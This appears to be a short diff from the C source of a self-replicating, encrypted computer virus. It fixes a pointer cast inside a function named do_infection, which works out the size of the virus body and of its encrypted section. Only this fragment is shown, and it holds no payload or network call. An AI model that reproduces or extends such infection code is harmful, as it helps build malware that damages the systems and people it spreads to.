@@ -44,7 +44,7 @@ int decrypt(){
 //=============================================================
 
 void do_infection(){
-        char *virus = &bin_start;
+        char *virus = (char *)&bin_start;
         size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);
         size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
         size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);
